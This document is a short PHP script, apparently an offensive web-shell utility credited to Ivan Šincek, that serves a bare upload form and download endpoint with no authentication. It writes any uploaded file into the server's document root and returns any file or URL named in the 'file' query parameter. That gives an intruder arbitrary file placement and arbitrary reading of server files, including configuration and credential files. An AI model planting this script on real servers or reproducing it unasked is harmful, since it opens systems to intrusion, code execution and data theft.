<?php $p='file';$o=null;if(isset($_SERVER['REQUEST_METHOD'])&&strtolower($_SERVER['REQUEST_METHOD'])==='post'&&isset($_FILES[$p]['name'])&&($_FILES[$p]['name']=trim($_FILES[$p]['name']))&&strlen($_FILES[$p]['name'])>0){$o=$_SERVER['DOCUMENT_ROOT'].'/'.$_FILES[$p]['name'];if(@move_uploaded_file($_FILES[$p]['tmp_name'],$o)===false){$o='ERROR: Cannot upload file.';}else{$o="SUCCESS: File was uploaded to '{$o}'";}unset($_FILES[$p]);}if(isset($_SERVER['REQUEST_METHOD'])&&strtolower($_SERVER['REQUEST_METHOD'])==='get'&&isset($_GET[$p])&&($_GET[$p]=trim($_GET[$p]))&&strlen($_GET[$p])>0){$o=@file_get_contents($_GET[$p]);if($o===false){$o='ERROR: Cannot download file';}else{header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($_GET[$p]).'"');echo $o;$o='download';}unset($_GET[$p]);}/*if($o!='download'){echo"<pre>{$o}</pre>";unset($o);}/*@gc_collect_cycles();*/ ?><?php if($o!='download'): ?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>PHP File Upload/Download</title><meta name="author" content="Ivan Šincek"><meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><form method="post" enctype="multipart/form-data" action="<?php echo './'.basename($_SERVER['SCRIPT_FILENAME']); ?>"><input name="<?php echo $p; ?>" type="file" required="required"><input type="submit" value="Upload"></form><pre><?php echo $o;unset($o);/*@gc_collect_cycles();*/ ?></pre></body></html><?php endif; ?>
